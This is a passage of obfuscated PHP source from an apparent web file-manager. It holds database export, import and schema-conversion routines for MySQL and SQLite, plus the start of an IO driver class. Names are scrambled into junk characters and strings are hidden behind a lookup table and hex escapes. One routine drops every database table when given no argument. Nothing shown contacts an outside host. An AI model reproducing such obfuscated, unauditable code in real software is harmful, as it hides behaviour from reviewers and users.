sqlSplit(IO::getContent($ğ¯§¯¿÷)); foreach ($î©ü‹‹ as $¶‹¤íË‡) { $‚íƒ¯Œñ = stripos($¶‹¤íË‡, $·ÇÄ‰Ğ¸[1062]) === 0; if ($‚íƒ¯Œñ) { $·Áö¬”ç->task[$·ÇÄ‰Ğ¸[784]] += 1; } $³§—Ú•¸->execute($¶‹¤íË‡); if ($‚íƒ¯Œñ) { preg_match($·ÇÄ‰Ğ¸[1063], $¶‹¤íË‡, $ÚÛ„îçÀ); $·Áö¬”ç->task[$·ÇÄ‰Ğ¸[1064]] = $ÚÛ„îçÀ[1]; $·Áö¬”ç->update(1); } } } public function insertTable($•™ÇíÀˆ, &$ÊúÇãßö) { $‘É‡Òò =& $_SERVER[Ôó‡è­ƒ]; $ƒ„›ƒ¡€ = $this->model()->db(); $ŸÉ°¥Ãø = $úÂ›†óÂ ? array($úÂ›†óÂ) : $ƒ„›ƒ¡€->getTables(); foreach ($•™ÇíÀˆ as $ÃÇ‰ºüÙ) { $úÂ›†óÂ = basename($ÃÇ‰ºüÙ, $‘É‡Òò[786]); if (!in_array($úÂ›†óÂ, $ŸÉ°¥Ãø)) { continue; } $ÊúÇãßö->task[$‘É‡Òò[1064]] = $úÂ›†óÂ; if (get_filesize($ÃÇ‰ºüÙ) == 0) { continue; } $¢ş»¦‡Ú = $this->sqlToDb($ÃÇ‰ºüÙ, $ÊúÇãßö); if (!$¢ş»¦‡Ú) { ActionCall($‘É‡Òò[1060], !0, 0); show_json(LNG($‘É‡Òò[1065]) . "\133{$úÂ›†óÂ}\135", !1); } } } public function sqlFromDb($® º¹¸À, $‰€ªØ±, &$¬¤È÷ºá, $ö¶éÊ™â = '') { if ($¬¤È÷ºá) { $¬¤È÷ºá->task[$_SERVER[Ôó‡è­ƒ][1064]] = $® º¹¸À; } $¤Šı¡Ä× = $this->model($® º¹¸À); $ŒÖıóã = 0; $ğêÓ€Ÿ = 0; $Œåœô½© = 10000; $àó½ ŠÎ = fopen($‰€ªØ±, $_SERVER[Ôó‡è­ƒ][1066]); $–è”°»â = $¤Šı¡Ä×->getPk(); $ÏçĞğ´ü = $¤Šı¡Ä×->getDbFields(); $áüŠÁ´ = $_SERVER[Ôó‡è­ƒ][12]; if ($GLOBALS[$_SERVER[Ôó‡è­ƒ][785]] && in_array($® º¹¸À, array($_SERVER[Ôó‡è­ƒ][1067], $_SERVER[Ôó‡è­ƒ][1068]))) { $áüŠÁ´ = $® º¹¸À; } do { $èË²‚¾¿ = array($–è”°»â => array($_SERVER[Ôó‡è­ƒ][1014], $ğêÓ€Ÿ)); $·ò‹×ˆ¹ = $¤Šı¡Ä×->where($èË²‚¾¿)->field($ÏçĞğ´ü)->order($–è”°»â . $_SERVER[Ôó‡è­ƒ][1069])->limit($Œåœô½©)->select(); $·ò‹×ˆ¹ = !empty($·ò‹×ˆ¹) ? $·ò‹×ˆ¹ : array(); if (!($™¨ ûòÉ = count($·ò‹×ˆ¹))) { break; } $üÌ—Ÿ›Ş = end($·ò‹×ˆ¹); $ğêÓ€Ÿ = $üÌ—Ÿ›Ş[$–è”°»â]; $†ÆŒé¥ = array(); foreach ($·ò‹×ˆ¹ as $ ­ ŠÂ¯) { if ($áüŠÁ´) { if ($® º¹¸À == $_SERVER[Ôó‡è­ƒ][1067]) { if ($ ­ ŠÂ¯[$_SERVER[Ôó‡è­ƒ][33]] == $_SERVER[Ôó‡è­ƒ][1070]) { $€òµÀºŠ = json_decode($ ­ ŠÂ¯[$_SERVER[Ôó‡è­ƒ][373]], !0); if ($€òµÀºŠ[$_SERVER[Ôó‡è­ƒ][32]] == $GLOBALS[$_SERVER[Ôó‡è­ƒ][785]] && $€òµÀºŠ[$_SERVER[Ôó‡è­ƒ][748]] != 1) { continue; } } } else { if ($ ­ ŠÂ¯[$_SERVER[Ôó‡è­ƒ][33]] == $_SERVER[Ôó‡è­ƒ][1071] && $ ­ ŠÂ¯[$_SERVER[Ôó‡è­ƒ][95]] == $_SERVER[Ôó‡è­ƒ][777]) { continue; } } } if ($ö¶éÊ™â) { $ ­ ŠÂ¯[$_SERVER[Ôó‡è­ƒ][78]] = "\173\x69\x6f\x3a{$ö¶éÊ™â}\x7d" . substr($ ­ ŠÂ¯[$_SERVER[Ôó‡è­ƒ][78]], strlen("\173\151\x6f\72{$ ­ ŠÂ¯[$_SERVER[Ôó‡è­ƒ][815]]}\x7d")); $ ­ ŠÂ¯[$_SERVER[Ôó‡è­ƒ][815]] = $ö¶éÊ™â; } $†ÆŒé¥[] = $_SERVER[Ôó‡è­ƒ][1072] . $this->sqlEncode($ ­ ŠÂ¯) . $_SERVER[Ôó‡è­ƒ][1073]; } $©ºğÁÊ¥ = "\111\x4e\x53\x45\x52\124\x20\111\116\x54\x4f\40\140{$® º¹¸À}\140\40\50\x60" . implode($_SERVER[Ôó‡è­ƒ][1074], $ÏçĞğ´ü) . $_SERVER[Ôó‡è­ƒ][1075]; fwrite($àó½ ŠÎ, $©ºğÁÊ¥ . implode($_SERVER[Ôó‡è­ƒ][1076], $†ÆŒé¥) . $_SERVER[Ôó‡è­ƒ][71] . PHP_EOL); $ŒÖıóã += $™¨ ûòÉ; if ($¬¤È÷ºá) { $¬¤È÷ºá->update($™¨ ûòÉ); } } while ($Œåœô½© == $™¨ ûòÉ); fclose($àó½ ŠÎ); return $ŒÖıóã; } public function sqlToDb($«©¤òÏ˜, &$ç‹şÚ») { $ö´‘ÇÏÂ =& $_SERVER[Ôó‡è­ƒ]; $‘å¢æ¨‚ = $this->model()->db(); $®ĞŸİ¿‚ = @fopen($«©¤òÏ˜, $ö´‘ÇÏÂ[1077]); if (!$®ĞŸİ¿‚) { return !1; } $¹¡«Êôú = 0; $»È©Øï¦ = $ö´‘ÇÏÂ[12]; $¯µÔŒ¤Ä = array(); $†Œá«Æˆ = $this->dbType(); $Ôş—Øˆ = $†Œá«Æˆ == $ö´‘ÇÏÂ[13] ? 500 : 2000; $…­Ó¡ö = basename($«©¤òÏ˜, $ö´‘ÇÏÂ[786]); $Æ´ÍÛ†Á = 0; $ŒáÓ¶¡ = 4194304 - 104858; $øËĞÂŸï = 1000000 - 104858; while (!feof($®ĞŸİ¿‚)) { $ÃêŸÂ¨ß = trim(fgets($®ĞŸİ¿‚)); if (!$ÃêŸÂ¨ß) { continue; } $³Î„¹–ˆ = $this->sqlDecode($ÃêŸÂ¨ß, $†Œá«Æˆ, $…­Ó¡ö); if (stripos($³Î„¹–ˆ, $ö´‘ÇÏÂ[354]) === 0) { if (!$»È©Øï¦) { $»È©Øï¦ = $³Î„¹–ˆ . $ö´‘ÇÏÂ[53]; } continue; } if ($ç‹şÚ») { $ç‹şÚ»->task[$ö´‘ÇÏÂ[784]] += 1; } $¹¡«Êôú++; $¯µÔŒ¤Ä[] = rtrim(rtrim(trim($³Î„¹–ˆ), $ö´‘ÇÏÂ[50]), $ö´‘ÇÏÂ[71]); $àğóˆìÊ = null; $òÚ·À¸ = strlen($³Î„¹–ˆ); $Æ´ÍÛ†Á += $òÚ·À¸; if ($Æ´ÍÛ†Á >= ($Ôş—Øˆ == 500 ? $øËĞÂŸï : $ŒáÓ¶¡)) { $àğóˆìÊ = array_pop($¯µÔŒ¤Ä); if ($¹¡«Êôú > 1) { $¹¡«Êôú--; } } if ($¹¡«Êôú >= $Ôş—Øˆ || $àğóˆìÊ) { $³Î„¹–ˆ = $»È©Øï¦ . implode($ö´‘ÇÏÂ[50], $¯µÔŒ¤Ä); if (!$‘å¢æ¨‚->execute($³Î„¹–ˆ)) { return !1; } if ($ç‹şÚ») { $ç‹şÚ»->update($¹¡«Êôú); } $¯µÔŒ¤Ä = array(); $¹¡«Êôú = 0; $Æ´ÍÛ†Á = 0; if ($àğóˆìÊ) { $¯µÔŒ¤Ä = array($àğóˆìÊ); $¹¡«Êôú = 1; $Æ´ÍÛ†Á = $òÚ·À¸; } } } fclose($®ĞŸİ¿‚); if (!empty($¯µÔŒ¤Ä)) { $³Î„¹–ˆ = $»È©Øï¦ . implode($ö´‘ÇÏÂ[50], $¯µÔŒ¤Ä); if (!$‘å¢æ¨‚->execute($³Î„¹–ˆ)) { return !1; } if ($ç‹şÚ») { $ç‹şÚ»->update($¹¡«Êôú); } } return !0; } public function dropTable($äÔÍ­· = null) { $ ÕÓ­ˆô = $this->model()->db(); $§À£æœî = $äÔÍ­· ? array($äÔÍ­·) : $ ÕÓ­ˆô->getTables(); if (!$§À£æœî) { return; } foreach ($§À£æœî as $äÔÍ­·) { if ($äÔÍ­·) { $äÔÍ­· = strtolower($äÔÍ­·); } else { continue; } $ ÕÓ­ˆô->execute("\x64\162\157\160\40\x74\x61\142\x6c\145\40\x69\146\x20\145\x78\151\x73\x74\163\40\140{$äÔÍ­·}\140"); } } private function sqlEncode($‰°Ï‰¡¯) { $·ÂĞ¾î =& $_SERVER[Ôó‡è­ƒ]; $Ìº™Äã = array(); foreach ($‰°Ï‰¡¯ as $àÛ¯§Ó) { if (is_array($àÛ¯§Ó)) { $àÛ¯§Ó = json_encode_force($àÛ¯§Ó); } $àÛ¯§Ó = addslashes($àÛ¯§Ó); $àÛ¯§Ó = str_replace(array($·ÂĞ¾î[1078], $·ÂĞ¾î[230]), array($·ÂĞ¾î[1079], $·ÂĞ¾î[1080]), $àÛ¯§Ó); $Ìº™Äã[] = str_replace($·ÂĞ¾î[58], $·ÂĞ¾î[1081], $àÛ¯§Ó); } return $·ÂĞ¾î[58] . implode($·ÂĞ¾î[1082], $Ìº™Äã) . $·ÂĞ¾î[58]; } private function sqlDecode($‘¨¡ë‰­, $í˜Àê , $õıëµà = '') { $¬Ë“Úãà =& $_SERVER[Ôó‡è­ƒ]; $‘¨¡ë‰­ = str_replace(array($¬Ë“Úãà[1079], $¬Ë“Úãà[1080]), array($¬Ë“Úãà[1078], $¬Ë“Úãà[230]), $‘¨¡ë‰­); if ($í˜Àê  == $¬Ë“Úãà[13]) { return $õıëµà != $¬Ë“Úãà[1083] ? stripslashes($‘¨¡ë‰­) : $‘¨¡ë‰­; } if ($õıëµà == $¬Ë“Úãà[1083]) { $‘¨¡ë‰­ = str_replace($¬Ë“Úãà[1084], $¬Ë“Úãà[119], stripslashes($‘¨¡ë‰­)); } return $‘¨¡ë‰­; } public function getSqlFile($¡¡Ìöîë = '') { $®½“‚Ê =& $_SERVER[Ôó‡è­ƒ]; $ïº²ó¥Ç = $this->dbType(!0); $¸§ëÔãÑ = CONTROLLER_DIR . "\151\x6e\163\164\141\x6c\154\57\144\x61\164\x61\x2f{$ïº²ó¥Ç}\56\x73\161\154"; $Æ¸Ïª˜ = file_get_contents($¸§ëÔãÑ); $ü²³µ® = $®½“‚Ê[1085] . ($ïº²ó¥Ç == $®½“‚Ê[802] ? $®½“‚Ê[1086] : $®½“‚Ê[1087]) . $®½“‚Ê[1088]; preg_match_all($ü²³µ®, $Æ¸Ïª˜, $ÊµèÕà¡); $¬ƒéÇ÷§ = $ÊµèÕà¡[1]; $°ñ¢”† = $this->model()->db(); $¤†½Í³ = $°ñ¢”†->getTables(); $»×Û·Àû = TEMP_FILES . $®½“‚Ê[1089] . date($®½“‚Ê[749]) . $®½“‚Ê[8]; del_dir($»×Û·Àû); mk_dir($»×Û·Àû); $İ¥±»Î· = $»×Û·Àû . $®½“‚Ê[1090]; $ÒÙµëåÎ = $»×Û·Àû . $®½“‚Ê[1091]; $‚¯–¼é³ = $ïº²ó¥Ç == $®½“‚Ê[13] ? $®½“‚Ê[802] : $®½“‚Ê[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\x74\141\x6c\x6c\x2f\144\141\x74\x61\x2f{$‚¯–¼é³}\56\x73\x71\154", $»×Û·Àû); @touch($»×Û·Àû . $ïº²ó¥Ç . $®½“‚Ê[786]); $ÜÉÏäš† = fopen($İ¥±»Î·, $®½“‚Ê[1066]); $—ÈˆåŸ = fopen($ÒÙµëåÎ, $®½“‚Ê[1066]); if ($ïº²ó¥Ç == $®½“‚Ê[13]) { $¤†½Í³ = array_diff($¤†½Í³, array($®½“‚Ê[782], $®½“‚Ê[783])); $„ìü³ê¼ = array($®½“‚Ê[1092], $®½“‚Ê[1093], $®½“‚Ê[1094]); fwrite($—ÈˆåŸ, implode(PHP_EOL, $„ìü³ê¼) . PHP_EOL . PHP_EOL); foreach ($¤†½Í³ as $úşöğ‰æ) { $öö€àŠŒ = $this->sqlFromSqlite($úşöğ‰æ); if (!$öö€àŠŒ[$®½“‚Ê[13]]) { continue; } fwrite($—ÈˆåŸ, $öö€àŠŒ[$®½“‚Ê[13]] . PHP_EOL . PHP_EOL); if (!in_array($úşöğ‰æ, $¬ƒéÇ÷§)) { fwrite($ÜÉÏäš†, $öö€àŠŒ[$®½“‚Ê[802]] . PHP_EOL . PHP_EOL); } } } else { foreach ($¤†½Í³ as $úşöğ‰æ) { $öö€àŠŒ = $this->sqlFromMysql($úşöğ‰æ); if (!$öö€àŠŒ[$®½“‚Ê[802]]) { continue; } fwrite($ÜÉÏäš†, $öö€àŠŒ[$®½“‚Ê[802]] . PHP_EOL . PHP_EOL); if (!in_array($úşöğ‰æ, $¬ƒéÇ÷§)) { fwrite($—ÈˆåŸ, $öö€àŠŒ[$®½“‚Ê[13]] . PHP_EOL . PHP_EOL); } } } fclose($ÜÉÏäš†); fclose($—ÈˆåŸ); $Æ¸Ïª˜ = array($®½“‚Ê[802] => $İ¥±»Î·, $®½“‚Ê[13] => $ÒÙµëåÎ); return $¡¡Ìöîë ? $Æ¸Ïª˜[$¡¡Ìöîë] : $Æ¸Ïª˜; } public function dbType($£»Ş = false) { $Ë…û¨ôœ =& $_SERVER[Ôó‡è­ƒ]; $òüëñİ¦ = $£»Ş ? $GLOBALS[$Ë…û¨ôœ[6]][$Ë…û¨ôœ[21]] : $this->database; $òüëñİ¦ = array_change_key_case($òüëñİ¦); $éò¤¾·… = $òüëñİ¦[$Ë…û¨ôœ[967]]; if ($éò¤¾·… == $Ë…û¨ôœ[964]) { $œ»çÌ = explode($Ë…û¨ôœ[4], $òüëñİ¦[$Ë…û¨ôœ[973]]); $éò¤¾·… = $œ»çÌ[0]; } $±’ôÔ…ü = array($Ë…û¨ôœ[1095] => $Ë…û¨ôœ[13], $Ë…û¨ôœ[912] => $Ë…û¨ôœ[802]); if (isset($±’ôÔ…ü[$éò¤¾·…])) { $éò¤¾·… = $±’ôÔ…ü[$éò¤¾·…]; } return $éò¤¾·…; } public function sqlFromMysql($îƒŠü­, $İüäˆšê = '') { $ñÖ¹ù„Ï =& $_SERVER[Ôó‡è­ƒ]; $Ôé¸ƒâ¥ = $this->model()->db(); $±“ì‘„ = $Ôé¸ƒâ¥->query($ñÖ¹ù„Ï[1096] . $îƒŠü­ . $ñÖ¹ù„Ï[384]); if (!$±“ì‘„ || !$±“ì‘„[0]) { return !1; } $–Ø ‚®“ = _get($±“ì‘„[0], $ñÖ¹ù„Ï[1097], $ñÖ¹ù„Ï[12]); if (!$–Ø ‚®“) { return !1; } $…£ÖÖ½ = "\104\x52\117\120\40\x54\x41\x42\114\x45\40\x49\x46\x20\105\130\x49\x53\x54\x53\40\140{$îƒŠü­}\140\73" . PHP_EOL . $–Ø ‚®“ . $ñÖ¹ù„Ï[71]; if ($İüäˆšê && $İüäˆšê == $ñÖ¹ù„Ï[802]) { return $…£ÖÖ½; } $ºæ•Å‰ü = array_change_key_case($GLOBALS[$ñÖ¹ù„Ï[6]][$ñÖ¹ù„Ï[21]]); $‚í±Î»¨ = $ºæ•Å‰ü[$ñÖ¹ù„Ï[972]]; $—àÓó‚ = $ñÖ¹ù„Ï[1098] . $‚í±Î»¨ . $ñÖ¹ù„Ï[1099] . $îƒŠü­ . $ñÖ¹ù„Ï[58]; $ª½å‚‰™ = $ñÖ¹ù„Ï[1100] . $îƒŠü­ . $ñÖ¹ù„Ï[900]; $ıËôÔò½ = $Ôé¸ƒâ¥->query($—àÓó‚); if (empty($ıËôÔò½)) { $Õ„ü…ôØ = array($ñÖ¹ù„Ï[802] => $ñÖ¹ù„Ï[12], $ñÖ¹ù„Ï[13] => $ñÖ¹ù„Ï[12]); return $İüäˆšê ? $Õ„ü…ôØ[$İüäˆšê] : $Õ„ü…ôØ; } $”ˆš»İ¶ = $Ôé¸ƒâ¥->query($ª½å‚‰™); $ê‰·Ûê­ = $ñÖ¹ù„Ï[12]; $—€“×áª = array(); foreach ($”ˆš»İ¶ as $‘¨¨´İ¹) { if (!$ê‰·Ûê­ && $‘¨¨´İ¹[$ñÖ¹ù„Ï[1101]] == $ñÖ¹ù„Ï[1102]) { $ê‰·Ûê­ = $‘¨¨´İ¹[$ñÖ¹ù„Ï[1103]]; } if (isset($—€“×áª[$‘¨¨´İ¹[$ñÖ¹ù„Ï[1101]]])) { $—€“×áª[$‘¨¨´İ¹[$ñÖ¹ù„Ï[1101]]][$ñÖ¹ù„Ï[1104]][] = $‘¨¨´İ¹[$ñÖ¹ù„Ï[1103]]; continue; } $—€“×áª[$‘¨¨´İ¹[$ñÖ¹ù„Ï[1101]]] = array($ñÖ¹ù„Ï[1105] => $‘¨¨´İ¹[$ñÖ¹ù„Ï[1101]], $ñÖ¹ù„Ï[1104] => array($‘¨¨´İ¹[$ñÖ¹ù„Ï[1103]]), $ñÖ¹ù„Ï[1106] => $‘¨¨´İ¹[$ñÖ¹ù„Ï[1107]] == $ñÖ¹ù„Ï[89] ? 0 : 1); } $¼ÃğõÄ¡ = array(); foreach ($—€“×áª as $‘¨¨´İ¹) { $Õ°ÔƒË¡ = $‘¨¨´İ¹[$ñÖ¹ù„Ï[1105]] == $ñÖ¹ù„Ï[1102]; $”Ì±­˜Í = array($ñÖ¹ù„Ï[1108], $‘¨¨´İ¹[$ñÖ¹ù„Ï[1106]] == $ñÖ¹ù„Ï[89] && !$Õ°ÔƒË¡ ? $ñÖ¹ù„Ï[1109] : $ñÖ¹ù„Ï[12], $ñÖ¹ù„Ï[1110], $ñÖ¹ù„Ï[1111] . $îƒŠü­ . $ñÖ¹ù„Ï[11] . ($Õ°ÔƒË¡ ? $ñÖ¹ù„Ï[1112] : $‘¨¨´İ¹[$ñÖ¹ù„Ï[1105]]) . $ñÖ¹ù„Ï[119], $ñÖ¹ù„Ï[1113], $ñÖ¹ù„Ï[119] . $îƒŠü­ . $ñÖ¹ù„Ï[119], $ñÖ¹ù„Ï[1114] . implode($ñÖ¹ù„Ï[1115], $‘¨¨´İ¹[$ñÖ¹ù„Ï[1104]]) . $ñÖ¹ù„Ï[1116]); $¼ÃğõÄ¡[] = implode($ñÖ¹ù„Ï[53], $”Ì±­˜Í) . $ñÖ¹ù„Ï[71]; } $¯–˜•Â« = array(); $ĞõÉ¤ƒ = array($ñÖ¹ù„Ï[1117] => $ñÖ¹ù„Ï[1118], $ñÖ¹ù„Ï[1118] => $ñÖ¹ù„Ï[1118], $ñÖ¹ù„Ï[287] => $ñÖ¹ù„Ï[314], $ñÖ¹ù„Ï[286] => $ñÖ¹ù„Ï[314]); foreach ($ıËôÔò½ as $‘¨¨´İ¹) { $”Ì±­˜Í = array($ñÖ¹ù„Ï[119] . $‘¨¨´İ¹[$ñÖ¹ù„Ï[1119]] . $ñÖ¹ù„Ï[119], isset($ĞõÉ¤ƒ[$‘¨¨´İ¹[$ñÖ¹ù„Ï[1120]]]) ? $ĞõÉ¤ƒ[$‘¨¨´İ¹[$ñÖ¹ù„Ï[1120]]] : $‘¨¨´İ¹[$ñÖ¹ù„Ï[1121]], $‘¨¨´İ¹[$ñÖ¹ù„Ï[1122]] == $ñÖ¹ù„Ï[898] ? $ñÖ¹ù„Ï[1123] : $ñÖ¹ù„Ï[1124], $‘¨¨´İ¹[$ñÖ¹ù„Ï[1119]] == $ê‰·Ûê­ ? $ñÖ¹ù„Ï[1125] : $ñÖ¹ù„Ï[12], $‘¨¨´İ¹[$ñÖ¹ù„Ï[949]] ? strtoupper(str_replace($ñÖ¹ù„Ï[11], $ñÖ¹ù„Ï[12], $‘¨¨´İ¹[$ñÖ¹ù„Ï[949]])) : $ñÖ¹ù„Ï[12]); $¯–˜•Â«[] = trim(implode($ñÖ¹ù„Ï[53], $”Ì±­˜Í)); } $å¦™´Ë = array($ñÖ¹ù„Ï[1126] . $îƒŠü­ . $ñÖ¹ù„Ï[1127], $ñÖ¹ù„Ï[1128] . $îƒŠü­ . $ñÖ¹ù„Ï[1129], implode($ñÖ¹ù„Ï[50] . PHP_EOL, $¯–˜•Â«), $ñÖ¹ù„Ï[946]); $Ó‡£†¹Ú = implode(PHP_EOL, array_merge($å¦™´Ë, $¼ÃğõÄ¡)); if ($İüäˆšê && $İüäˆšê == $ñÖ¹ù„Ï[13]) { return $Ó‡£†¹Ú; } $Õ„ü…ôØ = array($ñÖ¹ù„Ï[802] => $…£ÖÖ½, $ñÖ¹ù„Ï[13] => $Ó‡£†¹Ú); return $İüäˆšê ? $Õ„ü…ôØ[$İüäˆšê] : $Õ„ü…ôØ; } public function sqlFromSqlite($ ìüÓø, $’¥Î²Ö• = '') { $°¨ø´ïŞ =& $_SERVER[Ôó‡è­ƒ]; $Æ¯õëÏ€ = $this->model()->db(); $Ò½›¾Ûü = "\x50\x52\x41\x47\115\x41\x20\124\101\x42\114\x45\137\111\116\106\117\x20\50\47{$ ìüÓø}\47\51"; $°ÍæíåĞ = "\x53\x45\x4c\105\x43\x54\x20\52\40\x46\x52\x4f\x4d\x20\x73\161\x6c\151\x74\x65\x5f\155\x61\163\x74\145\162\x20\x57\x48\105\122\105\40\x74\x62\154\x5f\x6e\x61\155\145\x20\75\40\47{$ ìüÓø}\47"; $ú•»•âŞ = $Æ¯õëÏ€->query($Ò½›¾Ûü); if (empty($ú•»•âŞ)) { $ğç‡ñ‚Ã = array($°¨ø´ïŞ[802] => $°¨ø´ïŞ[12], $°¨ø´ïŞ[13] => $°¨ø´ïŞ[12]); return $’¥Î²Ö• ? $ğç‡ñ‚Ã[$’¥Î²Ö•] : $ğç‡ñ‚Ã; } $îÜ’˜Ş = $Æ¯õëÏ€->query($°ÍæíåĞ); $·”Áµ‡ü = $îÚêÆ = array(); foreach ($îÜ’˜Ş as $°‰‘ÏĞ´) { if ($°‰‘ÏĞ´[$°¨ø´ïŞ[33]] == $°¨ø´ïŞ[278]) { $·”Áµ‡ü[] = $°‰‘ÏĞ´[$°¨ø´ïŞ[1130]]; } else { $îÚêÆ[$°‰‘ÏĞ´[$°¨ø´ïŞ[32]]] = $°‰‘ÏĞ´[$°¨ø´ïŞ[1130]]; } } $òîãÌ¿£ = array_merge(array($°¨ø´ïŞ[1126] . $ ìüÓø . $°¨ø´ïŞ[119]), $·”Áµ‡ü, array_values($îÚêÆ)); $òîãÌ¿£ = implode($°¨ø´ïŞ[71] . PHP_EOL, $òîãÌ¿£) . $°¨ø´ïŞ[71]; if ($’¥Î²Ö• && $’¥Î²Ö• == $°¨ø´ïŞ[13]) { return $òîãÌ¿£; } $ú‚Æ ° = array(); $„”Œ³ú™ = array($°¨ø´ïŞ[1118] => $°¨ø´ïŞ[1131], $°¨ø´ïŞ[314] => $°¨ø´ïŞ[1132]); $ˆÊùĞÒ = $°¨ø´ïŞ[12]; foreach ($ú•»•âŞ as $°‰‘ÏĞ´) { if ($°‰‘ÏĞ´[$°¨ø´ïŞ[57]] == $°¨ø´ïŞ[89]) { $ˆÊùĞÒ = $°‰‘ÏĞ´[$°¨ø´ïŞ[32]]; } $Ş½Ñ˜’± = array($°¨ø´ïŞ[384] . $°‰‘ÏĞ´[$°¨ø´ïŞ[32]] . $°¨ø´ïŞ[384], isset($„”Œ³ú™[$°‰‘ÏĞ´[$°¨ø´ïŞ[33]]]) ? $„”Œ³ú™[$°‰‘ÏĞ´[$°¨ø´ïŞ[33]]] : $°‰‘ÏĞ´[$°¨ø´ïŞ[33]], $°‰‘ÏĞ´[$°¨ø´ïŞ[35]] == $°¨ø´ïŞ[89] ? $°¨ø´ïŞ[1123] : $°¨ø´ïŞ[1133] . $°‰‘ÏĞ´[$°¨ø´ïŞ[56]], $°‰‘ÏĞ´[$°¨ø´ïŞ[57]] == $°¨ø´ïŞ[89] ? $°¨ø´ïŞ[1134] : $°¨ø´ïŞ[12]); $ú‚Æ °[] = trim(implode($°¨ø´ïŞ[53], $Ş½Ñ˜’±)); } foreach ($îÚêÆ as $É£”ÆÌş => $Âøèñ³…) { $È¤¿ ¢˜ = str_replace($°¨ø´ïŞ[1135] . $ ìüÓø . $°¨ø´ïŞ[11], $°¨ø´ïŞ[12], $É£”ÆÌş); $…Ä½ŠãÆ = str_replace(array($°¨ø´ïŞ[119], $°¨ø´ïŞ[957]), $°¨ø´ïŞ[384], substr($Âøèñ³…, stripos($Âøèñ³…, $°¨ø´ïŞ[259]))); if ($È¤¿ ¢˜ == $°¨ø´ïŞ[1112]) { $óüığš = $°¨ø´ïŞ[1136] . $ˆÊùĞÒ . $°¨ø´ïŞ[1137]; } else { $óüığš = (stripos($È¤¿ ¢˜, $°¨ø´ïŞ[11]) ? $°¨ø´ïŞ[1138] : $°¨ø´ïŞ[12]) . ($°¨ø´ïŞ[1139] . $È¤¿ ¢˜ . $°¨ø´ïŞ[1140] . $…Ä½ŠãÆ); } $ú‚Æ °[] = $óüığš; } $Ìµ©Íö† = array($°¨ø´ïŞ[1141] . $ ìüÓø . $°¨ø´ïŞ[1142], $°¨ø´ïŞ[1143] . $ ìüÓø . $°¨ø´ïŞ[1144], implode($°¨ø´ïŞ[50] . PHP_EOL, $ú‚Æ °), $°¨ø´ïŞ[1145]); $šøÙÊø° = implode(PHP_EOL, $Ìµ©Íö†); if ($’¥Î²Ö• && $’¥Î²Ö• == $°¨ø´ïŞ[802]) { return $šøÙÊø°; } $ğç‡ñ‚Ã = array($°¨ø´ïŞ[802] => $šøÙÊø°, $°¨ø´ïŞ[13] => $òîãÌ¿£); return $’¥Î²Ö• ? $ğç‡ñ‚Ã[$’¥Î²Ö•] : $ğç‡ñ‚Ã; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($€½ÑÖˆ, $Û¨üé ) { $«ùÆªÂ½ =& $_SERVER[Ôó‡è­ƒ]; $˜ÌæÏ€ = $Û¨üé ; $GLOBALS[$«ùÆªÂ½[1146]] = $«ùÆªÂ½[1147] . $€½ÑÖˆ; Hook::trigger($«ùÆªÂ½[1147] . $€½ÑÖˆ . $«ùÆªÂ½[1148], $˜ÌæÏ€); $¾¹ï  = self::driverMake($Û¨üé [0]); if (!$¾¹ï ) { return !1; } if (method_exists($¾¹ï , $€½ÑÖˆ)) { $…º¨ÁÜ† = @call_user_func_array(array($¾¹ï , $€½ÑÖˆ), $Û¨üé ); } else { if (method_exists($¾¹ï , $«ùÆªÂ½[1149])) { $…º¨ÁÜ† = @call_user_func_array(array($¾¹ï , $€½ÑÖˆ), $Û¨üé ); } else { if (method_exists(self, $€½ÑÖˆ)) { $…º¨ÁÜ† = @call_user_func_array(array(self, $€½ÑÖˆ), $Û¨üé ); } else { $…º¨ÁÜ† = call_user_func_array(array(parent, $€½ÑÖˆ), $Û¨üé ); } } } Hook::trigger($«ùÆªÂ½[1147] . $€½ÑÖˆ . $«ùÆªÂ½[1150], $˜ÌæÏ€, $…º¨ÁÜ†); return $…º¨ÁÜ†; } public static function init($§ş”) { return self::driverMake($§ş”); } public static function copy($åÃ¼Ó™, $¸âõ‰ûî, $‹æ›¼àß = false, $éÊŞ”® = false) { return self::copyMoveStart($åÃ¼Ó™, $¸âõ‰ûî, $‹æ›¼àß, $_SERVER[Ôó‡è­ƒ][548], $éÊŞ”®); } public static function move($²š„´êÃ, $ïš­ìÈ—, $š–­Ü« = false, $Œ’„ø Ú = false) { return self::copyMoveStart($²š„´êÃ, $ïš­ìÈ—, $š–­Ü«, $_SERVER[Ôó‡è­ƒ][550], $Œ’„ø Ú); } private static function copyMoveStart($¹Ğõ­Ø, $©Œ¤¤ŠŒ, $äÀŞå¸Ö, $ˆ”Â¶Ò¡, $Šß³ŠôÚ) { $áˆØ™î‡ =& $_SERVER[Ôó‡è­ƒ]; $Âó™Šê¦ = array($¹Ğõ­Ø, $©Œ¤¤ŠŒ, $äÀŞå¸Ö, $Šß³ŠôÚ); Hook::trigger($áˆØ™î‡[1147] . $ˆ”Â¶Ò¡ . $áˆØ™î‡[1148], $Âó™Šê¦); $İŸˆ‰Ğ = self::copyMove($¹Ğõ­Ø, $©Œ¤¤ŠŒ, $äÀŞå¸Ö, $ˆ”Â¶Ò¡, $Šß³ŠôÚ); Hook::trigger($áˆØ™î‡[1147] . $ˆ”Â¶Ò¡ . $áˆØ™î‡[1150], $Âó™Šê¦, $İŸˆ‰Ğ); return $İŸˆ‰Ğ; } public static function saveFile($¾÷†½ˆ, $Ùñ²¦•, $úÔ›¡© = true) { $ãìªĞ– =& $_SERVER[Ôó‡è­ƒ]; $®ıäñ­ = self::info($Ùñ²¦•); $´Ëô„˜™ = self::driverMake($¾÷†½ˆ); $ê›òË€´ = self::driverMake($Ùñ²¦•); $èŠÊâ±ñ = !1; if ($ê›òË€´->pathParse[$ãìªĞ–[1151]]) { $èŠÊâ±ñ = $ê›òË€´; $¸ñé™ß‡ = $ê›òË€´->pathParse[$ãìªĞ–[1151]]; $ê›òË€´ = self::driverMake($¸ñé™ß‡); } if ($´Ëô„˜™->pathParse[$ãìªĞ–[1151]]) { $§Â•ô´¤ = $´Ëô„˜™->pathParse[$ãìªĞ–[1151]]; $´Ëô„˜™ = self::driverMake($§Â•ô´¤); } $¾¡µ´¡¯ = $ê›òË€´->pathFather($Ùñ²¦•); $“ÍôÂœ = !0; if (!$úÔ›¡© && self::driverIsSame($´Ëô„˜™, $ê›òË€´)) { $“ÍôÂœ = !1; } $í• àïû = 